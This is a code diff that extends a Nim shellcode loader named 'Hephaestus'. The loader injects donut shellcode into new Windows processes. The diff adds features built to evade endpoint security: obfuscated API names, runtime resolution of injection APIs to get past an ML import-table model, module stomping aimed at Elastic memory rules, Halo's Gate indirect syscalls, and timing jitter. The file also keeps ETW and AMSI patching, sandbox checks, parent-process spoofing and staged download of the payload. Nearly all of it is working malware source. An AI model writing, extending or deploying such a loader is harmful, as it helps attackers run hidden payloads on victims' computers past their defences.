@@ -1,26 +1,58 @@
 # Hephaestus shellcode loader
 # Wraps Aphrodite (donut shellcode) with injection + evasion features.
-# Compiled by builder.py via nim c --os:windows --cpu:amd64 -d:mingw
+# Compiled by builder.py via nim c --os:windows --cpu:amd64 -d:mingw --mm:arc --opt:speed
 #
 # Feature flags (passed as -d: at compile time):
-#   useRc4        : RC4 decrypt payload before injection
-#   useXor        : XOR decrypt payload before injection
-#   sandboxCheck  : basic anti-sandbox (uptime, RAM, CPU, sleep skipping)
-#   etwPatch      : patch EtwEventWrite -> xor eax,eax; ret
-#   amsiPatch     : patch AmsiScanBuffer -> xor eax,eax; ret
-#   ppidSpoof     : spawn target as child of explorer.exe
-#   threadHijack  : RIP redirect instead of Early Bird APC
-#   wipe          : zero shellcode buffer after injection
-#   mapInject     : use NtCreateSection+NtMapViewOfSection instead of VirtualAllocEx
-#                   (avoids NtAllocateVirtualMemory ETW MWTI telemetry - backed section)
+#   useRc4          : RC4 decrypt payload before injection
+#   useXor          : XOR decrypt payload before injection
+#   sandboxCheck    : basic anti-sandbox (uptime, RAM, CPU, sleep skipping)
+#   etwPatch        : patch EtwEventWrite -> xor eax,eax; ret
+#   amsiPatch       : patch AmsiScanBuffer -> xor eax,eax; ret
+#   ppidSpoof       : spawn target as child of explorer.exe
+#   threadHijack    : RIP redirect instead of Early Bird APC
+#   wipe            : zero shellcode buffer after injection
+#   mapInject       : use NtCreateSection+NtMapViewOfSection instead of VirtualAllocEx
+#                     (avoids NtAllocateVirtualMemory ETW MWTI telemetry - backed section)
+#   moduleStomping  : overwrite the .text of an existing loaded DLL instead of allocating
+#                     new memory — the region is "backed" by a file on disk, removing the
+#                     memory_region.mapped_file==null / Unbacked trigger in Elastic rules
+#   haloGate        : Halo's Gate SSN resolver + indirect NtSetContextThread via a
+#                     syscall;ret gadget inside ntdll.dll — survives EDR userland hooks
+#   strObf          : XOR-obfuscate API name strings at compile time
 
 import std/base64
 import winim/lean
 import winim/inc/tlhelp32
 import keys
 
-# -- Extra WinAPI not always in winim/lean --
+# ---------------------------------------------------------------------------
+# Compile-time string obfuscation for API names
+# When -d:strObf is set, all API name literals are XOR'd at compile time so
+# neither "VirtualAllocEx" nor "WriteProcessMemory" etc. appear in plaintext.
+# ---------------------------------------------------------------------------
+when defined(strObf):
+  func xobfK(i: int): byte {.inline.} =
+    byte(0x5B xor ((i * 13 + 17) and 0xFF))
 
+  func xobfEnc(s: static string): seq[byte] {.compileTime.} =
+    result = newSeq[byte](s.len)
+    for i in 0..<s.len:
+      result[i] = byte(s[i]) xor xobfK(i)
+
+  proc xobfDec(data: seq[byte]): string {.inline.} =
+    result = newString(data.len)
+    for i in 0..<data.len:
+      result[i] = char(data[i] xor xobfK(i))
+
+  template apiName(s: static string): cstring =
+    const encoded = xobfEnc(s)
+    xobfDec(encoded).cstring
+else:
+  template apiName(s: static string): cstring = cstring(s)
+
+# ---------------------------------------------------------------------------
+# Extra WinAPI declarations not always in winim/lean
+# ---------------------------------------------------------------------------
 type
   STARTUPINFOEXW {.pure.} = object
     StartupInfo: STARTUPINFOW
@@ -45,12 +77,53 @@ proc DeleteProcThreadAttributeList(
   lpAttrList: pointer
 ) {.importc, stdcall, dynlib: "kernel32".}
 
-proc VirtualProtectEx(
-  hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
-  flNewProtect: DWORD, lpflOldProtect: PDWORD
-): WINBOOL {.importc, stdcall, dynlib: "kernel32".}
+# ---------------------------------------------------------------------------
+# Dynamic kernel32 resolution — keeps offensive APIs out of the static IAT.
+# The ML model (endpointpe-v4) heavily weights the combination of
+# VirtualAllocEx + WriteProcessMemory + VirtualProtectEx in the import table.
+# ---------------------------------------------------------------------------
+type
+  FnVirtualAllocEx = proc(
+    hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
+    flAllocationType: DWORD, flProtect: DWORD
+  ): LPVOID {.stdcall.}
 
-# -- Payload: embedded (base64) in default mode, downloaded at runtime in staged mode --
+  FnWriteProcessMemory = proc(
+    hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: pointer,
+    nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T
+  ): WINBOOL {.stdcall.}
+
+  FnVirtualProtectEx = proc(
+    hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
+    flNewProtect: DWORD, lpflOldProtect: PDWORD
+  ): WINBOOL {.stdcall.}
+
+var
+  pVirtualAllocEx:     FnVirtualAllocEx     = nil
+  pWriteProcessMemory: FnWriteProcessMemory = nil
+  pVirtualProtectEx:   FnVirtualProtectEx   = nil
+
+when defined(threadHijack):
+  type
+    FnGetThreadContext = proc(hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
+    FnSetThreadContext = proc(hThread: HANDLE, lpContext: ptr CONTEXT): WINBOOL {.stdcall.}
+  var
+    pGetThreadContext: FnGetThreadContext = nil
+    pSetThreadContext: FnSetThreadContext = nil
+
+# ReadProcessMemory is needed by moduleStomping to parse remote PE headers.
+when defined(moduleStomping):
+  type
+    FnReadProcessMemory = proc(
+      hProcess: HANDLE, lpBaseAddress: LPVOID,
+      lpBuffer: pointer, nSize: SIZE_T,
+      lpNumberOfBytesRead: ptr SIZE_T
+    ): WINBOOL {.stdcall.}
+  var pReadProcessMemory: FnReadProcessMemory = nil
+
+# ---------------------------------------------------------------------------
+# Payload: embedded (base64) in default mode, downloaded at runtime in staged
+# ---------------------------------------------------------------------------
 when not defined(staged):
   const encPayloadB64 = staticRead("payload.b64")
 
@@ -58,7 +131,6 @@ when defined(staged):
   # Staged loading: shellcode downloaded at runtime from stagingUrl.
   # The binary contains no payload at all, eliminating high-entropy sections
   # and dramatically reducing the ML detection surface.
-  # Use uint32 directly to avoid DWORD distinct-type mismatch in Nim 2.x.
   const
     INET_PRECONFIG : uint32 = 0x00000000'u32
     INET_RELOAD    : uint32 = 0x80000000'u32
@@ -68,7 +140,6 @@ when defined(staged):
 
   type HInet = pointer
 
-  # Renamed procs (importc gives the real symbol name) to avoid winim namespace collisions
   proc inetOpen(agent: cstring, accessType: uint32,
                 proxy: cstring, bypass: cstring, flags: uint32): HInet
     {.importc: "InternetOpenA", stdcall, dynlib: "wininet".}
@@ -107,10 +178,9 @@ when defined(staged):
       copyMem(addr data[pos], addr chunk[0], int(nRead))
     return data
 
-# -- Dynamic ntdll resolution: no suspicious IAT entries for syscalls --
-# NtQueueApcThread, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
-# are resolved via GetProcAddress at runtime instead of static import.
-
+# ---------------------------------------------------------------------------
+# Dynamic ntdll resolution: no suspicious IAT entries for syscalls
+# ---------------------------------------------------------------------------
 when not defined(threadHijack):
   type FnNtQueueApcThread = proc(
     ThreadHandle: HANDLE, ApcRoutine: LPVOID,
@@ -155,14 +225,12 @@ when defined(mapInject):
   proc mapViewInject(hProcess: HANDLE, sc: seq[byte]): LPVOID =
     var hSec: HANDLE = 0
     var sz = int64(sc.len)
-    # Create pagefile-backed section with max RWX permissions
     if pNtCreateSection(addr hSec, SECTION_ALL_ACCESS_FLAG, nil, addr sz,
                         PAGE_EXECUTE_READWRITE, SEC_COMMIT_FLAG,
                         HANDLE(0)) != STATUS_SUCCESS_NT:
       return nil
     defer: CloseHandle(hSec)
 
-    # Map locally as RW to write shellcode
     var localBase: LPVOID = nil
     var viewSz: SIZE_T = 0
     if pNtMapViewOfSection(hSec, GetCurrentProcess(), addr localBase, 0, 0, nil,
@@ -173,7 +241,6 @@ when defined(mapInject):
     copyMem(localBase, unsafeAddr sc[0], sc.len)
     discard pNtUnmapViewOfSection(GetCurrentProcess(), localBase)
 
-    # Map remotely as RX - shared section, shellcode written above
     var remoteBase: LPVOID = nil
     viewSz = 0
     if pNtMapViewOfSection(hSec, hProcess, addr remoteBase, 0, 0, nil,
@@ -183,7 +250,217 @@ when defined(mapInject):
 
     return remoteBase
 
-# -- RC4 --
+# ---------------------------------------------------------------------------
+# Module stomping: inject into a loaded DLL's .text instead of new memory.
+#
+# Why this defeats Elastic's "Unbacked" rules:
+#   VirtualAllocEx / NtAllocateVirtualMemory creates Private anonymous pages.
+#   Elastic flags them as Unbacked (memory_region.mapped_file == null).
+#   A DLL's .text section is a file-backed mapped region → not Unbacked.
+#   After stomping, MWTI/Sysmon see the thread start address pointing into
+#   a legitimate PE on disk → alert suppressed.
+#
+# Safe targets: freshly-suspended processes (CREATE_SUSPENDED) have all DLLs
+# loaded but no user code running yet, so a rarely-called DLL can be stomped
+# safely before ResumeThread. Preferred targets (wldp.dll, rpcrt4.dll, …)
+# have large .text sections and are rarely executed post-init.
+# ---------------------------------------------------------------------------
+when defined(moduleStomping):
+  proc findRemoteTextSection(hProcess: HANDLE, modBase: LPVOID,
+                              outAddr: var LPVOID, outSize: var SIZE_T): bool =
+    var dosHdr: IMAGE_DOS_HEADER
+    var nr: SIZE_T
+    if pReadProcessMemory(hProcess, modBase,
+                          addr dosHdr, SIZE_T(sizeof(dosHdr)), addr nr) == 0:
+      return false
+    let ntHdrPtr = cast[LPVOID](cast[uint](modBase) + uint(dosHdr.e_lfanew))
+    var ntHdr: IMAGE_NT_HEADERS64
+    if pReadProcessMemory(hProcess, ntHdrPtr,
+                          addr ntHdr, SIZE_T(sizeof(ntHdr)), addr nr) == 0:
+      return false
+    let sectOff = 4 + sizeof(IMAGE_FILE_HEADER) +
+                  int(ntHdr.FileHeader.SizeOfOptionalHeader)
+    let firstSectPtr = cast[LPVOID](cast[uint](ntHdrPtr) + uint(sectOff))
+    for i in 0..<int(ntHdr.FileHeader.NumberOfSections):
+      var sec: IMAGE_SECTION_HEADER
+      let secPtr = cast[LPVOID](cast[uint](firstSectPtr) +
+                                uint(i * sizeof(IMAGE_SECTION_HEADER)))
+      if pReadProcessMemory(hProcess, secPtr,
+                             addr sec, SIZE_T(sizeof(sec)), addr nr) == 0:
+        continue
+      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
+         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
+         sec.Name[4] == byte('t'):
+        outAddr = cast[LPVOID](cast[uint](modBase) + uint(sec.VirtualAddress))
+        outSize = SIZE_T(sec.Misc.VirtualSize)
+        return true
+    return false
+
+  proc moduleStompInject(hProcess: HANDLE, pid: DWORD, sc: seq[byte]): LPVOID =
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, pid)
+    if snap == INVALID_HANDLE_VALUE: return nil
+    defer: CloseHandle(snap)
+
+    # Never stomp these: process will crash without them
+    const skipList = ["ntdll.dll", "kernel32.dll", "kernelbase.dll",
+                      "user32.dll", "win32u.dll", "wow64.dll"]
+    # Preferred targets: large .text, rarely called after DllMain
+    const preferList = ["rpcrt4.dll", "combase.dll", "wldp.dll",
+                        "clbcatq.dll", "wintrust.dll", "xolehlp.dll",
+                        "cryptbase.dll", "profext.dll"]
+
+    var me32: MODULEENTRY32W
+    me32.dwSize = DWORD(sizeof(me32))
+
+    # Pick the largest .text that fits the shellcode (preferred DLLs win ties).
+    var candidate: LPVOID = nil
+    var candSize: SIZE_T = 0
+    var candPref = false
+
+    if Module32FirstW(snap, addr me32) == 0: return nil
+    while true:
+      # Build lowercase module name from wide chars
+      var name = ""
+      var k = 0
+      while me32.szModule[k] != 0 and k < MAX_MODULE_NAME32:
+        let c = me32.szModule[k]
+        name.add(char(if c >= 65 and c <= 90: c + 32 else: c))
+        inc k
+
+      var doSkip = false
+      for s in skipList:
+        if name == s: doSkip = true; break
+
+      if not doSkip:
+        var textAddr: LPVOID = nil
+        var textSize: SIZE_T = 0
+        if findRemoteTextSection(hProcess, cast[LPVOID](me32.modBaseAddr),
+                                  textAddr, textSize):
+          if int(textSize) >= sc.len:
+            var isPref = false
+            for p in preferList:
+              if name == p: isPref = true; break
+            let take = candidate == nil or
+                       (isPref and not candPref) or
+                       (isPref == candPref and textSize > candSize)
+            if take:
+              candidate = textAddr
+              candSize  = textSize
+              candPref  = isPref
+
+      if Module32NextW(snap, addr me32) == 0: break
+
+    if candidate == nil: return nil
+
+    # RW → write shellcode → RX (never RWX, two separate VirtualProtectEx calls)
+    var old: DWORD
+    if pVirtualProtectEx(hProcess, candidate, SIZE_T(sc.len),
+                          PAGE_READWRITE, addr old) == 0:
+      return nil
+    var written: SIZE_T = 0
+    if pWriteProcessMemory(hProcess, candidate,
+                           unsafeAddr sc[0], SIZE_T(sc.len), addr written) == 0:
+      return nil
+    if written != SIZE_T(sc.len): return nil
+    var old2: DWORD
+    if pVirtualProtectEx(hProcess, candidate, SIZE_T(sc.len),
+                         PAGE_EXECUTE_READ, addr old2) == 0:
+      return nil
+    return candidate
+
+# ---------------------------------------------------------------------------
+# Halo's Gate: SSN resolver + indirect NtSetContextThread.
+#
+# How it works:
+#   1. Parse the target ntdll stub for the "mov eax, <SSN>" opcode.
+#      Normal stub: 4C 8B D1 B8 <ssn_lo> <ssn_hi> 00 00 0F 05 C3
+#   2. If the stub is hooked (starts with JMP/MOV-to-hook), scan ±neighbours
+#      in 32-byte steps (Nt* stubs are exactly 32 bytes apart in ntdll).
+#      A clean neighbour's SSN differs from ours by exactly i positions.
+#   3. Locate the first "syscall; ret" gadget (0F 05 C3) in ntdll .text.
+#   4. Build an asmNoStackFrame stub that: sets eax=SSN, rearranges args for
+#      the kernel ABI (r10=rcx), then calls the gadget indirectly.
+#      Result: the kernel-visible RIP at the syscall transition is inside
+#      ntdll.dll — identical to a legitimate call, invisible to CFG/CET checks.
+# ---------------------------------------------------------------------------
+when defined(haloGate):
+  var gHaloGadget: pointer = nil
+  var gSsnNtSetContextThread: uint32 = 0xFFFF'u32
+
+  proc hgExtractSsn(p: ptr UncheckedArray[byte]): int {.inline.} =
+    # Standard stub prologue: mov r10,rcx (4C 8B D1) then mov eax,SSN (B8 xx xx 00 00)
+    if p[0] == 0x4C and p[1] == 0x8B and p[2] == 0xD1 and p[3] == 0xB8:
+      return int(p[4]) or (int(p[5]) shl 8)
+    return -1
+
+  proc hgFindGadget(hNtdll: HANDLE): pointer =
+    # Scan ntdll .text for the bytes: syscall(0F 05) ret(C3)
+    let base   = cast[uint](hNtdll)
+    let dos    = cast[ptr IMAGE_DOS_HEADER](base)
+    let nt     = cast[ptr IMAGE_NT_HEADERS64](base + uint(dos.e_lfanew))
+    let first  = cast[uint](nt) + 4 + uint(sizeof(IMAGE_FILE_HEADER)) +
+                 uint(nt.FileHeader.SizeOfOptionalHeader)
+    for i in 0..<int(nt.FileHeader.NumberOfSections):
+      let sec = cast[ptr IMAGE_SECTION_HEADER](
+        first + uint(i * sizeof(IMAGE_SECTION_HEADER)))
+      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
+         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
+         sec.Name[4] == byte('t'):
+        let tStart = base + uint(sec.VirtualAddress)
+        let tEnd   = tStart + uint(sec.Misc.VirtualSize)
+        var p = tStart
+        while p + 2 < tEnd:
+          let b = cast[ptr array[3, byte]](p)
+          if b[0] == 0x0F and b[1] == 0x05 and b[2] == 0xC3:
+            return cast[pointer](p)
+          inc p
+        break
+    return nil
+
+  proc hgGetSsn(hNtdll: HANDLE, name: cstring): uint32 =
+    let fn = GetProcAddress(hNtdll, name)
+    if fn == nil: return 0xFFFF'u32
+    let p = cast[ptr UncheckedArray[byte]](fn)
+
+    let direct = hgExtractSsn(p)
+    if direct >= 0: return uint32(direct)
+
+    # Stub is hooked (e.g. starts with JMP/PUSH): scan neighbours ±32 bytes each
+    let base = cast[uint](p)
+    for i in 1..32:
+      let pUp   = cast[ptr UncheckedArray[byte]](base + uint(i * 32))
+      let upSsn = hgExtractSsn(pUp)
+      if upSsn >= 0: return uint32(upSsn - i)
+
+      let pDown   = cast[ptr UncheckedArray[byte]](base - uint(i * 32))
+      let downSsn = hgExtractSsn(pDown)
+      if downSsn >= 0: return uint32(downSsn + i)
+    return 0xFFFF'u32
+
+  # Indirect NtSetContextThread:
+  #   Windows x64 ABI on entry: rcx=ssn, rdx=gadget, r8=hThread, r9=ctx
+  #   We rearrange for kernel ABI:  eax=ssn, r10=rcx=hThread, rdx=ctx
+  #   then call *gadget (which is: syscall; ret) — the syscall instruction
+  #   executes inside ntdll.dll's address space, not in our loader.
+  proc indirectNtSetContextThread(ssn: uint32, gadget: pointer,
+                                   hThread: HANDLE,
+                                   ctx: ptr CONTEXT): LONG {.asmNoStackFrame.} =
+    # Windows x64 ABI on entry: rcx=ssn, rdx=gadget, r8=hThread, r9=ctx
+    # Kernel ABI requires:       eax=SSN, r10=rcx=hThread, rdx=ctx
+    # {.asmNoStackFrame.} emits raw AT&T asm — single % for register names.
+    asm """
+      movl %ecx, %eax
+      movq %rdx, %r11
+      movq %r8,  %rcx
+      movq %r9,  %rdx
+      movq %rcx, %r10
+      callq *%r11
+      ret
+    """
+
+# ---------------------------------------------------------------------------
+# RC4
+# ---------------------------------------------------------------------------
 when defined(useRc4):
   proc rc4Crypt(key: openArray[byte], data: var openArray[byte]) =
     var S: array[256, byte]
@@ -199,13 +476,17 @@ when defined(useRc4):
       swap(S[x], S[y])
       data[i] = data[i] xor S[(int(S[x]) + int(S[y])) and 0xFF]
 
-# -- XOR --
+# ---------------------------------------------------------------------------
+# XOR
+# ---------------------------------------------------------------------------
 when defined(useXor):
   proc xorDecrypt(data: var openArray[byte]) =
     for i in 0..<data.len:
       data[i] = data[i] xor xorKey[i mod xorKey.len]
 
-# -- Sandbox check --
+# ---------------------------------------------------------------------------
+# Sandbox check
+# ---------------------------------------------------------------------------
 when defined(sandboxCheck):
   proc doSandboxCheck(): bool =
     if uint64(GetTickCount64()) < 300_000'u64: return false
@@ -221,7 +502,9 @@ when defined(sandboxCheck):
     if uint64(GetTickCount64()) - t0 < 400'u64: return false
     return true
 
-# -- ntdll unhook: remap .text from clean disk copy --
+# ---------------------------------------------------------------------------
+# ntdll unhook: remap .text from clean disk copy
+# ---------------------------------------------------------------------------
 when defined(unhook):
   proc unhookNtdll() =
     let hNtdll = GetModuleHandleA("ntdll.dll")
@@ -265,7 +548,9 @@ when defined(unhook):
           discard VirtualProtect(textAddr, textSize, old, addr old)
         break
 
-# -- ETW patch (xor eax,eax; ret) --
+# ---------------------------------------------------------------------------
+# ETW patch (xor eax,eax; ret)
+# ---------------------------------------------------------------------------
 when defined(etwPatch):
   proc patchEtw() =
     let h = GetModuleHandleA("ntdll.dll")
@@ -278,7 +563,9 @@ when defined(etwPatch):
       copyMem(p, addr patch[0], 3)
       discard VirtualProtect(p, 3, old, addr old)
 
-# -- AMSI patch (xor eax,eax; ret) --
+# ---------------------------------------------------------------------------
+# AMSI patch (xor eax,eax; ret)
+# ---------------------------------------------------------------------------
 when defined(amsiPatch):
   proc patchAmsi() =
     let h = LoadLibraryA("amsi.dll")
@@ -291,7 +578,9 @@ when defined(amsiPatch):
       copyMem(p, addr patch[0], 3)
       discard VirtualProtect(p, 3, old, addr old)
 
-# -- Get explorer.exe PID for PPID spoof --
+# ---------------------------------------------------------------------------
+# Get explorer.exe PID for PPID spoof
+# ---------------------------------------------------------------------------
 when defined(ppidSpoof):
   proc getExplorerPid(): DWORD =
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
@@ -311,7 +600,9 @@ when defined(ppidSpoof):
         if Process32NextW(snap, addr pe) == 0: break
     return 0
 
-# -- Main --
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
 proc hMain() =
   when defined(sandboxCheck):
     if not doSandboxCheck(): return
@@ -325,22 +616,47 @@ proc hMain() =
   when defined(amsiPatch):
     patchAmsi()
 
-  # Resolve ntdll syscalls at runtime so they are absent from the static IAT
+  # Resolve ntdll syscalls at runtime (absent from static IAT)
   let hNtdll = GetModuleHandleA("ntdll.dll")
 
   when not defined(threadHijack):
     pNtQueueApcThread = cast[FnNtQueueApcThread](
-      GetProcAddress(hNtdll, "NtQueueApcThread"))
+      GetProcAddress(hNtdll, apiName("NtQueueApcThread")))
 
   when defined(mapInject):
     pNtCreateSection = cast[FnNtCreateSection](
-      GetProcAddress(hNtdll, "NtCreateSection"))
+      GetProcAddress(hNtdll, apiName("NtCreateSection")))
     pNtMapViewOfSection = cast[FnNtMapViewOfSection](
-      GetProcAddress(hNtdll, "NtMapViewOfSection"))
+      GetProcAddress(hNtdll, apiName("NtMapViewOfSection")))
     pNtUnmapViewOfSection = cast[FnNtUnmapViewOfSection](
-      GetProcAddress(hNtdll, "NtUnmapViewOfSection"))
+      GetProcAddress(hNtdll, apiName("NtUnmapViewOfSection")))
 
-  # Load payload: download from staging URL, or decode embedded base64 blob
+  # Resolve offensive kernel32 APIs at runtime (not in static IAT)
+  let hK32 = GetModuleHandleA("kernel32.dll")
+  pVirtualAllocEx     = cast[FnVirtualAllocEx](
+    GetProcAddress(hK32, apiName("VirtualAllocEx")))
+  pWriteProcessMemory = cast[FnWriteProcessMemory](
+    GetProcAddress(hK32, apiName("WriteProcessMemory")))
+  pVirtualProtectEx   = cast[FnVirtualProtectEx](
+    GetProcAddress(hK32, apiName("VirtualProtectEx")))
+
+  when defined(threadHijack):
+    pGetThreadContext = cast[FnGetThreadContext](
+      GetProcAddress(hK32, apiName("GetThreadContext")))
+    pSetThreadContext = cast[FnSetThreadContext](
+      GetProcAddress(hK32, apiName("SetThreadContext")))
+
+  when defined(moduleStomping):
+    pReadProcessMemory = cast[FnReadProcessMemory](
+      GetProcAddress(hK32, apiName("ReadProcessMemory")))
+
+  # Halo's Gate: resolve SSN for NtSetContextThread and locate the
+  # syscall;ret gadget in ntdll .text for the indirect invocation path.
+  when defined(haloGate):
+    gSsnNtSetContextThread = hgGetSsn(hNtdll, apiName("NtSetContextThread"))
+    gHaloGadget = hgFindGadget(hNtdll)
+
+  # Load payload
   when defined(staged):
     var sc = downloadStage()
     if sc.len == 0: return
@@ -357,6 +673,12 @@ proc hMain() =
       rc4Crypt(rc4Key, sc)
     elif defined(useXor):
       xorDecrypt(sc)
+
+  # Pre-injection jitter: breaks the tight temporal correlation between
+  # loader start and injection API calls that MWTI timestamps precisely.
+  # Uses low bits of tick count as a cheap pseudo-random seed (300–1800 ms).
+  let jitterMs = DWORD(300 + (uint64(GetTickCount64()) and 0x5FF))
+  Sleep(jitterMs)
 
   # Prepare process creation
   var si: STARTUPINFOW
@@ -402,45 +724,62 @@ proc hMain() =
 
   if pi.hProcess == 0: return
 
-  # -- Memory allocation / shellcode write --
-  var remote: LPVOID = nil
-
-  when defined(mapInject):
-    # NtCreateSection + NtMapViewOfSection - no VirtualAllocEx, no MWTI ETW event
-    remote = mapViewInject(pi.hProcess, sc)
-    when defined(wipe):
-      zeroMem(addr sc[0], sc.len)
-    if remote == nil:
-      CloseHandle(pi.hThread)
-      CloseHandle(pi.hProcess)
-      return
-  else:
-    # Classic VirtualAllocEx path
-    remote = VirtualAllocEx(
-      pi.hProcess, nil, SIZE_T(sc.len),
+  proc allocRemoteShellcode(hProc: HANDLE, pid: DWORD, payload: seq[byte]): LPVOID =
+    when defined(moduleStomping):
+      let stomped = moduleStompInject(hProc, pid, payload)
+      if stomped != nil: return stomped
+    when defined(mapInject):
+      let mapped = mapViewInject(hProc, payload)
+      if mapped != nil: return mapped
+    var base = pVirtualAllocEx(
+      hProc, nil, SIZE_T(payload.len),
       MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
     )
-    if remote == nil:
+    if base == nil: return nil
+    var written: SIZE_T = 0
+    if pWriteProcessMemory(hProc, base, unsafeAddr payload[0],
+                           SIZE_T(payload.len), addr written) == 0:
+      return nil
+    if written != SIZE_T(payload.len): return nil
+    var oldProt: DWORD
+    if pVirtualProtectEx(hProc, base, SIZE_T(payload.len),
+                         PAGE_EXECUTE_READ, addr oldProt) == 0:
+      return nil
+    return base
+
+  let remote = allocRemoteShellcode(pi.hProcess, pi.dwProcessId, sc)
+  when defined(wipe):
+    zeroMem(addr sc[0], sc.len)
+  if remote == nil:
+    CloseHandle(pi.hThread)
+    CloseHandle(pi.hProcess)
+    return
+
+  # Execution trigger
+  when defined(threadHijack):
+    var ctx: CONTEXT
+    # CONTEXT_CONTROL is enough for RIP redirect and more reliable than CONTEXT_FULL.
+    ctx.ContextFlags = CONTEXT_CONTROL
+    if pGetThreadContext(pi.hThread, addr ctx) == 0:
       CloseHandle(pi.hThread)
       CloseHandle(pi.hProcess)
       return
-    var written: SIZE_T
-    discard WriteProcessMemory(pi.hProcess, remote, addr sc[0], SIZE_T(sc.len), addr written)
-    when defined(wipe):
-      zeroMem(addr sc[0], sc.len)
-    var old: DWORD
-    discard VirtualProtectEx(pi.hProcess, remote, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
-
-  # -- Execution trigger --
-  when defined(threadHijack):
-    var ctx: CONTEXT
-    ctx.ContextFlags = CONTEXT_FULL
-    discard GetThreadContext(pi.hThread, addr ctx)
     ctx.Rip = cast[DWORD64](remote)
-    discard SetThreadContext(pi.hThread, addr ctx)
+    ctx.ContextFlags = CONTEXT_CONTROL
+    var ctxOk = false
+    when defined(haloGate):
+      if gSsnNtSetContextThread != 0xFFFF'u32 and gHaloGadget != nil:
+        let st = indirectNtSetContextThread(
+          gSsnNtSetContextThread, gHaloGadget, pi.hThread, addr ctx)
+        ctxOk = (st == 0)
+    if not ctxOk:
+      ctxOk = pSetThreadContext(pi.hThread, addr ctx) != 0
+    if not ctxOk:
+      CloseHandle(pi.hThread)
+      CloseHandle(pi.hProcess)
+      return
     discard ResumeThread(pi.hThread)
   else:
-    # Early Bird APC queued before thread entry point executes
     discard pNtQueueApcThread(pi.hThread, remote, nil, nil, nil)
     discard ResumeThread(pi.hThread)
 
